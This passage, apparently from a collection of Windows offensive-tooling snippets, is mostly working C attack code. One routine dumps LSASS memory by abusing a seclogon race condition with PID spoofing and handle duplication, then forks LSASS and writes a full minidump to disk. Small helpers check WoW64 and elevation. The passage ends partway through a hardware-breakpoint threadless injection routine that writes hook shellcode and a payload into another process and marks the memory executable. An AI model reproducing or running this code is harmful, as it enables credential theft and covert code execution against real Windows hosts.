typedef NTSTATUS(NTAPI* fnNtCreateProcessEx)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ParentProcess, ULONG Flags, HANDLE SectionHandle, HANDLE DebugPort, HANDLE ExceptionPort, ULONG JobMemberLevel);

// ==============================================================================================================================================================================================

#define	ONE_KB				1024
#define	ARRAY_SIZE			(ONE_KB * 8)
#define MAX_LSASS_DMP_SIZE	314572800

// ==============================================================================================================================================================================================

BOOL SetPrivilege(IN HANDLE hToken, IN LPCWSTR szPrivilegeName) {

	TOKEN_PRIVILEGES	TokenPrivs		= { 0x00 };
	LUID				Luid			= { 0x00 };

	if (!LookupPrivilegeValueW(NULL, szPrivilegeName, &Luid)) {
		printf("[!] LookupPrivilegeValueW Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	TokenPrivs.PrivilegeCount				= 0x01;
	TokenPrivs.Privileges[0].Luid			= Luid;
	TokenPrivs.Privileges[0].Attributes		= SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivs, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
		printf("[!] AdjustTokenPrivileges Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
		printf("[!] Not All Privileges Referenced Are Assigned To The Caller \n");
		return FALSE;
	}

	return TRUE;
}

// ==============================================================================================================================================================================================

BOOL WriteFileToDiskW(IN LPCWSTR szFileName, IN PBYTE pFileBuffer, OUT DWORD dwFileSize) {

	HANDLE		hFile						= INVALID_HANDLE_VALUE;
	DWORD		dwNumberOfBytesWritten		= 0x00;

	if (!szFileName || !pFileBuffer || !dwFileSize)
		goto _END_OF_FUNC;

	if ((hFile = CreateFileW(szFileName, GENERIC_READ | GENERIC_WRITE, 0x00, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}


	if (!WriteFile(hFile, pFileBuffer, dwFileSize, &dwNumberOfBytesWritten, NULL) || dwFileSize != dwNumberOfBytesWritten) {
		printf("[!] WriteFile Failed With Error: %d \n[i] Wrote %d Of %d Bytes \n", GetLastError(), dwNumberOfBytesWritten, dwFileSize);
		goto _END_OF_FUNC;
	}

_END_OF_FUNC:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	return (dwNumberOfBytesWritten == dwFileSize) ? TRUE : FALSE;
}

// ==============================================================================================================================================================================================

DWORD GetPidUsingFilePath(IN LPWSTR szProcessBinaryPath) {

	NTSTATUS					STATUS						= STATUS_SUCCESS;
	DWORD						dwReturnProcessId			= 0x00;
	HANDLE						hFile						= INVALID_HANDLE_VALUE;
	IO_STATUS_BLOCK				IoStatusBlock				= { 0 };
	PFILE_PROCESS_INFO			pFileProcIdInfo				= NULL;
	ULONG						uFileProcIdInfoSize			= ARRAY_SIZE;
	fnNtQueryInformationFile	pNtQueryInformationFile		= NULL;

	if (!(pNtQueryInformationFile = (fnNtQueryInformationFile)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtQueryInformationFile"))) {
		printf("[!] GetProcAddress [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if ((hFile = CreateFileW(szProcessBinaryPath, FILE_READ_ATTRIBUTES, (FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE), NULL, OPEN_EXISTING, 0x00, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pFileProcIdInfo = (PFILE_PROCESS_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, uFileProcIdInfoSize))) {
		printf("[!] HeapAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if ((STATUS = pNtQueryInformationFile(hFile, &IoStatusBlock, pFileProcIdInfo, uFileProcIdInfoSize, FileProcessIdsUsingFileInformation)) != STATUS_SUCCESS) {

		while (STATUS == STATUS_INFO_LENGTH_MISMATCH) {

			uFileProcIdInfoSize += ARRAY_SIZE;

			if (!(pFileProcIdInfo = (PFILE_PROCESS_INFO)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pFileProcIdInfo, uFileProcIdInfoSize))) {
				printf("[!] HeapReAlloc Failed With Error: %d \n", GetLastError());
				goto _END_OF_FUNC;
			}

			STATUS = pNtQueryInformationFile(hFile, &IoStatusBlock, pFileProcIdInfo, uFileProcIdInfoSize, FileProcessIdsUsingFileInformation);
		}

		if (STATUS != STATUS_SUCCESS) {
			printf("[!] NtQueryInformationFile Failed With Error: 0x%0.8X \n", STATUS);
			goto _END_OF_FUNC;
		}
	}

	if (pFileProcIdInfo->NumberOfProcessIdsInList >= 1)
		dwReturnProcessId = pFileProcIdInfo->ProcessIdList[0];

_END_OF_FUNC:
	if (pFileProcIdInfo)
		HeapFree(GetProcessHeap(), 0x00, pFileProcIdInfo);
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	return dwReturnProcessId;
}

// ==============================================================================================================================================================================================

VOID PatchCurrentProcessID(IN DWORD dwNewPid, OUT OPTIONAL DWORD* pdwOldPid) {

	if (pdwOldPid)
		*pdwOldPid = HandleToUlong(((PTEB)__readgsqword(0x30))->ClientId.UniqueProcess);

	*(DWORD*)&((PTEB)__readgsqword(0x30))->ClientId.UniqueProcess = dwNewPid;
}

// ==============================================================================================================================================================================================

BOOL FindHandlesInProcess(IN DWORD dwProcessId, IN PUNICODE_STRING pusProcessTypeName, IN OUT PHANDLE phHandlesArray, IN OUT PDWORD pdwHandleArrayLength) {

	BOOL							bResult						= FALSE;
	NTSTATUS						STATUS						= 0x00;
	PSYSTEM_HANDLE_INFORMATION		pSysHandleInfo				= NULL;
	ULONG_PTR						uTmpBuffer					= NULL;
	DWORD							dwSysHandleInfoSize			= (ONE_KB * 64),
									dwTmpBufferLength			= (ONE_KB * 4);
	POBJECT_TYPES_INFORMATION		ObjectTypesInfo				= NULL;
	POBJECT_TYPE_INFORMATION_V2		CurrentObjType				= NULL;
	ULONG							uProcessTypeIndex			= 0x00;
	fnNtQuerySystemInformation		pNtQuerySystemInformation	= NULL;
	fnRtlCompareUnicodeString		pRtlCompareUnicodeString	= NULL;
	fnNtQueryObject					pNtQueryObject				= NULL;

	if (!(pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtQuerySystemInformation"))) {
		printf("[!] GetProcAddress [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		return FALSE;
	}

	if (!(pRtlCompareUnicodeString = (fnRtlCompareUnicodeString)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlCompareUnicodeString"))) {
		printf("[!] GetProcAddress [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		return FALSE;
	}

	if (!(pNtQueryObject = (fnNtQueryObject)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtQueryObject"))) {
		printf("[!] GetProcAddress [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		return FALSE;
	}

	do {

		if (!(uTmpBuffer = LocalAlloc(LPTR, dwTmpBufferLength))) {
			printf("[!] LocalAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
			return FALSE;
		}

		if ((STATUS = pNtQueryObject(NULL, ObjectTypesInformation, uTmpBuffer, dwTmpBufferLength, &dwTmpBufferLength)) != STATUS_SUCCESS && STATUS != STATUS_INFO_LENGTH_MISMATCH) {
			printf("[!] pNtQueryObject Failed With Error: 0x%0.8X \n", STATUS);
			return FALSE;
		}

		if (STATUS == STATUS_SUCCESS) {
			ObjectTypesInfo = (POBJECT_TYPES_INFORMATION)uTmpBuffer;
			break;
		}

		LocalFree(uTmpBuffer);

	} while (STATUS == STATUS_INFO_LENGTH_MISMATCH);

	if (!ObjectTypesInfo)
		return FALSE;

	CurrentObjType = (POBJECT_TYPE_INFORMATION_V2)OBJECT_TYPES_FIRST_ENTRY(ObjectTypesInfo);

	for (ULONG i = 0; i < ObjectTypesInfo->NumberOfTypes; i++) {
		if (pRtlCompareUnicodeString(pusProcessTypeName, &CurrentObjType->TypeName, TRUE) == 0) {
			uProcessTypeIndex = i + 2;
			break;
		}
		CurrentObjType = (POBJECT_TYPE_INFORMATION_V2)OBJECT_TYPES_NEXT_ENTRY(CurrentObjType);
	}

	if (!uProcessTypeIndex)
		return FALSE;

	if (!(pSysHandleInfo = (PSYSTEM_HANDLE_INFORMATION)LocalAlloc(LPTR, dwSysHandleInfoSize))) {
		printf("[!] LocalAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		return FALSE;
	}

	while ((STATUS = pNtQuerySystemInformation(SystemHandleInformation, pSysHandleInfo, dwSysHandleInfoSize, NULL)) == STATUS_INFO_LENGTH_MISMATCH)
		pSysHandleInfo = (PSYSTEM_HANDLE_INFORMATION)LocalReAlloc(pSysHandleInfo, dwSysHandleInfoSize *= 2, LMEM_MOVEABLE);

	for (ULONG i = 0; i < pSysHandleInfo->HandleCount; i++) {
		if (pSysHandleInfo->Handles[i].ObjectTypeIndex == uProcessTypeIndex && pSysHandleInfo->Handles[i].UniqueProcessId == dwProcessId) {
			phHandlesArray[*pdwHandleArrayLength]	= (HANDLE)pSysHandleInfo->Handles[i].HandleValue;
			*pdwHandleArrayLength					= *pdwHandleArrayLength + 1;
		}
	}

	bResult = TRUE;

_END_OF_FUNC:
	if (uTmpBuffer)
		LocalFree(uTmpBuffer);
	if (pSysHandleInfo)
		LocalFree(pSysHandleInfo);
	return bResult;
}


// ==============================================================================================================================================================================================

DWORD WINAPI ThreadSeclogonLock(IN LPVOID lpParameter) {

	DWORD					dwReturnCode					= 0x00;
	PTHREAD_PARM			pThreadParm						= (PTHREAD_PARM)lpParameter;
	PROCESS_INFORMATION		ProcessInfo						= { 0 };
	STARTUPINFO				StartupInfo						= { 0 };
	UNICODE_STRING			usProcessTypeName				= RTL_CONSTANT_STRING(L"Token");
	DWORD					dwCurrentOriginalPid			= 0x00,
							dwTokenHandlesCount				= 0x00;
	PHANDLE					hTokenHandlesArray				= NULL;
	BOOL					bUseCreateProcessWithToken		= FALSE,
							bProcessCreatedWithToken		= FALSE;

	if (!(hTokenHandlesArray = LocalAlloc(LPTR, ARRAY_SIZE))) {
		printf("[!] LocalAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		return FALSE;
	}

	printf("[i] Replacing Current Process ID With %d... ", pThreadParm->dwProcessPid);
	PatchCurrentProcessID(pThreadParm->dwProcessPid, &dwCurrentOriginalPid);
	printf("[+] DONE \n");

	if (!FindHandlesInProcess(pThreadParm->dwProcessPid, &usProcessTypeName, hTokenHandlesArray, &dwTokenHandlesCount))
		goto _END_OF_FUNC;

	if (dwTokenHandlesCount > 1)
		bUseCreateProcessWithToken = TRUE;
	else
		printf("[-] No Token Handles Found In The %d Process, Using CreateProcessWithLogonW \n", pThreadParm->dwProcessPid);

	if (bUseCreateProcessWithToken) {
		printf("[i] %d Tokens Detected, Using CreateProcessWithTokenW \n", dwTokenHandlesCount);
		for (DWORD i = 0; i < dwTokenHandlesCount; i++) {
			if (CreateProcessWithTokenW(hTokenHandlesArray[i], 0x00, NULL, pThreadParm->szCmndLine, 0x00, NULL, NULL, &StartupInfo, &ProcessInfo)) {
				bProcessCreatedWithToken = TRUE;
				break;
			}
		}
	}

	if (bUseCreateProcessWithToken && !bProcessCreatedWithToken)
		printf("[i] CreateProcessWithTokenW Failed, Using CreateProcessWithLogonW Instead \n");

	if (!bUseCreateProcessWithToken || (bUseCreateProcessWithToken && !bProcessCreatedWithToken)) {
		if (!CreateProcessWithLogonW(LOGON_USERNAME, LOGON_DOMAIN, LOGON_PASSWORD, LOGON_NETCREDENTIALS_ONLY, NULL, pThreadParm->szCmndLine, 0x00, NULL, NULL, &StartupInfo, &ProcessInfo)) {
			printf("[!] CreateProcessWithLogonW Failed With Error: %d \n", GetLastError());
			goto _END_OF_FUNC;
		}
	}

	printf("[+] Created Spoofed Process Of PID: %d \n", ProcessInfo.dwProcessId);

_END_OF_FUNC:
	if (hTokenHandlesArray)
		LocalFree(hTokenHandlesArray);
	if (dwCurrentOriginalPid)
		PatchCurrentProcessID(dwCurrentOriginalPid, NULL);
	if (ProcessInfo.hProcess)
		CloseHandle(ProcessInfo.hProcess);
	if (ProcessInfo.hThread)
		CloseHandle(ProcessInfo.hThread);
	return dwReturnCode;
}

// ==============================================================================================================================================================================================

BOOL CreateFileLock(IN HANDLE hFile, IN LPOVERLAPPED pOverLapped) {

	REQUEST_OPLOCK_INPUT_BUFFER		ReqOplockInput		= { 0x00 };
	REQUEST_OPLOCK_OUTPUT_BUFFER	ReqOplockOutput		= { 0x00 };

	ReqOplockInput.StructureVersion			= REQUEST_OPLOCK_CURRENT_VERSION;
	ReqOplockInput.StructureLength			= sizeof(REQUEST_OPLOCK_INPUT_BUFFER);
	ReqOplockInput.RequestedOplockLevel		= OPLOCK_LEVEL_CACHE_READ | OPLOCK_LEVEL_CACHE_HANDLE;
	ReqOplockInput.Flags					= REQUEST_OPLOCK_INPUT_FLAG_REQUEST;

	ReqOplockOutput.StructureVersion		= REQUEST_OPLOCK_CURRENT_VERSION;
	ReqOplockOutput.StructureLength			= sizeof(REQUEST_OPLOCK_OUTPUT_BUFFER);

	if (!DeviceIoControl(hFile, FSCTL_REQUEST_OPLOCK, &ReqOplockInput, sizeof(ReqOplockInput), &ReqOplockOutput, sizeof(ReqOplockOutput), NULL, pOverLapped) && GetLastError() != ERROR_IO_PENDING) {
		printf("[!] DeviceIoControl Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

// ==============================================================================================================================================================================================

BOOL LeakLsassHandleWithRaceCondition(IN DWORD dwLsassPid) {

	BOOL				bResult					= FALSE;
	OVERLAPPED			OverLapped				= { 0x00 };
	THREAD_PARM			ThreadParm				= { .dwProcessPid = dwLsassPid, .szCmndLine = FILE_TO_LOCK };
	HANDLE				hFile					= INVALID_HANDLE_VALUE,
						hThread					= NULL;
	DWORD				dwNmbrOfBytesTrnsfrd	= 0x00;

	if ((hFile = CreateFileW(FILE_TO_LOCK, FILE_GENERIC_READ, 0x00, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(OverLapped.hEvent = CreateEventW(NULL, FALSE, FALSE, NULL))) {
		printf("[!] CreateEventW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!CreateFileLock(hFile, &OverLapped))
		goto _END_OF_FUNC;

	if (!(hThread = CreateThread(NULL, 0x00, ThreadSeclogonLock, &ThreadParm, 0x00, NULL))) {
		printf("[!] CreateThread [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!GetOverlappedResult(hFile, &OverLapped, &dwNmbrOfBytesTrnsfrd, TRUE)) {
		printf("[!] GetOverlappedResult Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	printf("[*] Seclogon Thread Locked !\n");
	printf("[i] An Lsass Handle Will Be Available Within The Seclogon Process\n");

	bResult = TRUE;

_END_OF_FUNC:
	if (hThread)
		CloseHandle(hThread);
	return bResult;
}

// ==============================================================================================================================================================================================


BOOL ForkRemoteProcess(OUT HANDLE* phLsassHandle, IN HANDLE hDuplicatedHandle) {

	NTSTATUS				STATUS					= STATUS_SUCCESS;
	fnNtCreateProcessEx		pNtCreateProcessEx		= NULL;

	if (!(pNtCreateProcessEx = (fnNtCreateProcessEx)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtCreateProcessEx"))) {
		printf("[!] GetProcAddress [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		return FALSE;
	}

	if ((STATUS = pNtCreateProcessEx(phLsassHandle, MAXIMUM_ALLOWED, NULL, hDuplicatedHandle, 0x1001, NULL, NULL, NULL, 0x00)) != STATUS_SUCCESS) {
		printf("[!] NtCreateProcessEx Failed With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return *phLsassHandle == NULL ? FALSE : TRUE;
}


// ==============================================================================================================================================================================================


BOOL MinidumpCallbackRoutine(PVOID CallbackParam, PMINIDUMP_CALLBACK_INPUT CallbackInput, PMINIDUMP_CALLBACK_OUTPUT CallbackOutput) {

	PMINIDUMP_CALLBACK_PARM		pMiniDumpParm	= (PMINIDUMP_CALLBACK_PARM)CallbackParam;
	LPVOID						pSource			= NULL,
								pDestination	= NULL;
	DWORD						dwBufferSize	= 0x00;

	switch (CallbackInput->CallbackType) {

		case IoStartCallback: {
			CallbackOutput->Status = S_FALSE;
			break;
		}

		case IoWriteAllCallback: {
			CallbackOutput->Status = S_OK;

			pSource			= CallbackInput->Io.Buffer;
			pDestination	= (LPVOID)((DWORD_PTR)pMiniDumpParm->pDumpedBuffer + (DWORD_PTR)CallbackInput->Io.Offset);
			dwBufferSize	= CallbackInput->Io.BufferBytes;

			pMiniDumpParm->dwDumpedBufferSize += dwBufferSize;
			RtlCopyMemory(pDestination, pSource, dwBufferSize);

			break;
		}

		case IoFinishCallback: {
			CallbackOutput->Status = S_OK;
			break;
		}

		default:
			return TRUE;
	}

	return TRUE;
}


BOOL SeclogonRaceConditionLsassDump(IN DWORD dwLsassPid, IN LPWSTR szDumpPath) {

	BOOL							bDumped						= FALSE;
	DWORD							dwSecLogonPid				= 0x00,
									dwCurrentOriginalPid		= 0x00,
									dwProcessHandlesCount		= 0x00;
	HANDLE							hSeclogonProcess			= NULL,
									hDuplicatedHandle			= NULL,
									hLsassProcess				= NULL;
	PHANDLE							hProcessHandlesArray		= NULL;
	UNICODE_STRING					usProcessTypeName			= RTL_CONSTANT_STRING(L"Process");
	MINIDUMP_CALLBACK_INFORMATION	MiniDumpInfo				= { 0 };
	MINIDUMP_CALLBACK_PARM			MiniDumpParm				= { 0 };
	PROCESS_INFORMATION				ProcessInfo					= { 0 };
	STARTUPINFO						StartupInfo					= { 0 };

	if (!(hProcessHandlesArray = (PHANDLE)LocalAlloc(LPTR, ARRAY_SIZE))) {
		printf("[!] LocalAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		return FALSE;
	}

	if (!(dwSecLogonPid = GetPidUsingFilePath(SECLOGON_PATH))) {

		printf("[-] Seclogon Service Is Not Running \n");

		if (!CreateProcessWithTokenW((HANDLE)-1, 0x00, NULL, L"CMD", 0, NULL, NULL, &StartupInfo, &ProcessInfo) && GetLastError() != ERROR_INVALID_HANDLE) {
			printf("[!] CreateProcessWithTokenW [%d] Failed With Error: %d \n", __LINE__, GetLastError());
			goto _END_OF_FUNC;
		}

		printf("[i] Trying To Trigger It By Invoking Process With PID: %d...", ProcessInfo.dwProcessId);

		if (!(dwSecLogonPid = GetPidUsingFilePath(SECLOGON_PATH))) {
			printf("[!] FAILED \n");
			goto _END_OF_FUNC;
		}

		printf("[+] DONE \n");
	}

	printf("[+] Seclogon PID Fetched: %d \n", dwSecLogonPid);

	PatchCurrentProcessID(dwLsassPid, &dwCurrentOriginalPid);

	if (!LeakLsassHandleWithRaceCondition(dwLsassPid)) {
		goto _END_OF_FUNC;
	}

	PatchCurrentProcessID(dwCurrentOriginalPid, NULL);

	if (!FindHandlesInProcess(dwSecLogonPid, &usProcessTypeName, hProcessHandlesArray, &dwProcessHandlesCount) || dwProcessHandlesCount < 1) {
		printf("[-] No Process Handles To Lsass Found In Seclogon \n[!] The Race Condition Didn't Work!\n");
		goto _END_OF_FUNC;

	}

	if (!(hSeclogonProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, dwSecLogonPid))) {
		printf("[!] OpenProcess Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	for (DWORD i = 0; i < dwProcessHandlesCount; i++) {

		if (!DuplicateHandle(hSeclogonProcess, hProcessHandlesArray[i], (HANDLE)-1, &hDuplicatedHandle, 0x00, FALSE, DUPLICATE_SAME_ACCESS)) {
			printf("[!] DuplicateHandle Failed With Error: %d \n", GetLastError());
			continue;
		}

		printf("[+] Duplicated Handle: 0x%0.8X \n", hDuplicatedHandle);

		if (GetProcessId(hDuplicatedHandle) != dwLsassPid) {
			CloseHandle(hDuplicatedHandle);
			continue;
		}

		printf("[*] Fetched Process Handle To Lsass From Seclogon! \n");

		if (!ForkRemoteProcess(&hLsassProcess, hDuplicatedHandle)) {
			CloseHandle(hDuplicatedHandle);
			break;
		}

		printf("[*] Forked Lsass Process Handle: 0x%0.8X \n", hLsassProcess);

		if (!(MiniDumpParm.pDumpedBuffer = (LPVOID)LocalAlloc(LPTR, MAX_LSASS_DMP_SIZE))) {
			printf("[!] LocalAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
			CloseHandle(hDuplicatedHandle);
			CloseHandle(hLsassProcess);
			break;
		}

		MiniDumpInfo.CallbackRoutine = &MinidumpCallbackRoutine;
		MiniDumpInfo.CallbackParam = &MiniDumpParm;

		if (!SetHandleInformation(hLsassProcess, HANDLE_FLAG_PROTECT_FROM_CLOSE, HANDLE_FLAG_PROTECT_FROM_CLOSE)) {
			printf("[!] SetHandleInformation [%d] Failed With Error: %d \n", __LINE__, GetLastError());
			CloseHandle(hDuplicatedHandle);
			CloseHandle(hLsassProcess);
			LocalFree(MiniDumpParm.pDumpedBuffer);
			break;
		}

		if (!(bDumped = MiniDumpWriteDump(hLsassProcess, GetProcessId(hLsassProcess), NULL, MiniDumpWithFullMemory, NULL, NULL, &MiniDumpInfo))) {
			printf("[!] MiniDumpWriteDump Failed With Error: %d \n", GetLastError());
			CloseHandle(hDuplicatedHandle);
			CloseHandle(hLsassProcess);
			LocalFree(MiniDumpParm.pDumpedBuffer);
			break;
		}

		if (!SetHandleInformation(hLsassProcess, HANDLE_FLAG_PROTECT_FROM_CLOSE, 0x00)) {
			printf("[!] SetHandleInformation [%d] Failed With Error: %d \n", __LINE__, GetLastError());
			CloseHandle(hDuplicatedHandle);
			CloseHandle(hLsassProcess);
			LocalFree(MiniDumpParm.pDumpedBuffer);
			break;
		}

		WriteFileToDiskW(szDumpPath, MiniDumpParm.pDumpedBuffer, MiniDumpParm.dwDumpedBufferSize);

		break;
	}

_END_OF_FUNC:
	if (hSeclogonProcess)
		CloseHandle(hSeclogonProcess);
	if (ProcessInfo.hProcess)
		CloseHandle(ProcessInfo.hProcess);
	if (ProcessInfo.hThread)
		CloseHandle(ProcessInfo.hThread);
	if (dwCurrentOriginalPid)
		PatchCurrentProcessID(dwCurrentOriginalPid, NULL);
	if (hProcessHandlesArray)
		LocalFree(hProcessHandlesArray);
	if (MiniDumpParm.pDumpedBuffer)
		LocalFree(MiniDumpParm.pDumpedBuffer);
	return bDumped;
}


// ==============================================================================================================================================================================================

BOOL SeclogonRaceConditionDumpLsass(IN DWORD dwLsassPid, IN LPWSTR szDumpPath) {

	BOOL	bResult					= FALSE;
	HANDLE	hCurrentTokenHandle		= NULL;

	if (!dwLsassPid || !szDumpPath)
		return FALSE;

	if (!OpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES, &hCurrentTokenHandle)) {
		printf("[!] OpenProcessToken [%d] Failed With Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	if (!SetPrivilege(hCurrentTokenHandle, SE_DEBUG_NAME))
		goto _END_OF_FUNC;

	if (!SetPrivilege(hCurrentTokenHandle, SE_IMPERSONATE_NAME))
		goto _END_OF_FUNC;

	if (!SeclogonRaceConditionLsassDump(dwLsassPid, szDumpPath))
		goto _END_OF_FUNC;

	printf("[*] Lsass Dumped To %ws \n", szDumpPath);

	bResult = TRUE;

_END_OF_FUNC:
	if (hCurrentTokenHandle)
		CloseHandle(hCurrentTokenHandle);
	return bResult;
}
```
### Check If Process is WoW64
```c
#include <windows.h>
#include <stdio.h>
#include "Structs.h"

typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);

BOOL IsProcessWow(IN HANDLE hProcess) {

    NTSTATUS                        STATUS                          = 0x00;
    fnNtQueryInformationProcess     pNtQueryInformationProcess      = NULL;
    PVOID                           pIsWow64                        = NULL;

    if (!hProcess || hProcess == INVALID_HANDLE_VALUE)
        return FALSE;

    if (!(pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandle(TEXT("NTDLL.DLL")), "NtQueryInformationProcess"))) {
        printf("[!] GetProcAddress Failed With Error: %d \n", GetLastError());
        return FALSE;
    }

    if ((STATUS = pNtQueryInformationProcess(hProcess, ProcessWow64Information, &pIsWow64, sizeof(PVOID), NULL)) != 0x00) {
        printf("[!] NtQueryInformationProcess Failed With Error: 0x%0.8X \n", STATUS);
        return FALSE;
    }

    return pIsWow64 ? TRUE : FALSE;
}
```
### Check Process Elevation Status
```c
#include <windows.h>
#include <stdio.h>
BOOL IsProcessElevated() {

    HANDLE              hToken              = NULL;
    TOKEN_ELEVATION     TokenElvtion        = { 0 };
    DWORD               dwReturnLength      = 0x00;

    if (!OpenProcessToken((HANDLE)-1, TOKEN_QUERY, &hToken)) {
        printf("[!] OpenProcessToken Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!GetTokenInformation(hToken, TokenElevation, &TokenElvtion, sizeof(TOKEN_ELEVATION), &dwReturnLength)) {
        printf("[!] GetTokenInformation Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

_END_OF_FUNC:
    if (hToken != NULL)
        CloseHandle(hToken);
    return TokenElvtion.TokenIsElevated;
}
```
### Hardware Breakpoint Threadless Injection (Existing Process)
```c
#include <windows.h>
#include <stdio.h>
#include "Structs.h"
#include "ThreadlessInjection.h"

// ==========================================================================================================================
/* global variable from ThreadlessInjection.c */

extern NT_API g_NtApi;

/* threadless injection shellcode */

unsigned char g_HookShellcode[42] = {
		0x5B, 0x48, 0x83, 0xEB, 0x05, 0x53, 0x51, 0x52, 0x41, 0x51, 0x41, 0x50,
		0x41, 0x53, 0x41, 0x52, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00, 0x00,
		0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5A, 0x41, 0x5B, 0x41, 0x58, 0x41,
		0x59, 0x5A, 0x59, 0x5B, 0xFF, 0xE3
};


// ==========================================================================================================================



BOOL HandleHookingThreadFunction(IN OUT PTHREAD_PARMS pThreadParm) {

	NTSTATUS	STATUS				= STATUS_SUCCESS;
	SIZE_T		sTmpSizeVar			= pThreadParm->dwPayloadSize + sizeof(g_HookShellcode),
				sNmbrOfBytesWritten = NULL;
	DWORD		dwOldProtection		= 0x00;


	/* wait for 3 sec - this will provide some time for the debug event handler to initialize */
	WaitForSingleObject(pThreadParm->hProcess, 1 * 1000);

	printf("[i] Wait Delay Finished\n");


	/* find memory hole */
	if (!FindMemoryHole(pThreadParm->hProcess, &pThreadParm->uMemoryHole, pThreadParm->uTargetFuncAddress, sTmpSizeVar)) {
		printf("[!] Failed To Allocate A Memory Hole \n");
		return FALSE;
	}

	printf("[+] Discorvered Memory Hole At: 0x%p\n", pThreadParm->uMemoryHole);

	/* write 'g_HookShellcode' at the start of the memory hole */
	if (!NT_SUCCESS((STATUS = g_NtApi.pNtWriteVirtualMemory(pThreadParm->hProcess, pThreadParm->uMemoryHole, g_HookShellcode, sizeof(g_HookShellcode), &sNmbrOfBytesWritten))) || sNmbrOfBytesWritten != sizeof(g_HookShellcode)) {
		printf("[!] NtWriteVirtualMemory [%d] Failed With Error: %d \n", __LINE__, STATUS);
		printf("[i] Wrote %d Of %d Bytes \n", sNmbrOfBytesWritten, sizeof(g_HookShellcode));
		return FALSE;
	}

	/* write the main payload under the 'g_HookShellcode' shellcode in the memory hole */
	if (!NT_SUCCESS((STATUS = g_NtApi.pNtWriteVirtualMemory(pThreadParm->hProcess, (pThreadParm->uMemoryHole + sNmbrOfBytesWritten), pThreadParm->uPayloadAddress, pThreadParm->dwPayloadSize, &sNmbrOfBytesWritten))) || sNmbrOfBytesWritten != pThreadParm->dwPayloadSize) {
		printf("[!] NtWriteVirtualMemory [%d] Failed With Error: %d \n", __LINE__, STATUS);
		printf("[i] Wrote %d Of %d Bytes \n", sNmbrOfBytesWritten, pThreadParm->dwPayloadSize);
		return FALSE;
	}

	printf("[+] Payloads Are Written At The Memory Hole\n");

	/* mark as executable */
	if (!NT_SUCCESS((STATUS = g_NtApi.pNtProtectVirtualMemory(pThreadParm->hProcess, &pThreadParm->uMemoryHole, &sTmpSizeVar, PAGE_EXECUTE_READWRITE, &dwOldProtection)))) {
		printf("[!] NtProtectVirtualMemory Failed With Error: %d \n", STATUS);
		return FALSE;
	}

	/* install a hardware breakpoint at 'pThreadParm->uTargetFuncAddress' in every thread of the target process */
	if (!HardwareHookOrUnhookProcess(pThreadParm->szProcessName, NULL, pThreadParm->uTargetFuncAddress, InstallHooks)) {
		printf("[!] HardwareHookOrUnhookProcess Failed To Install A Hook At: 0x%p\n", pThreadParm->uTargetFuncAddress);
		return FALSE;
	}

	return TRUE;
}



// ==========================================================================================================================



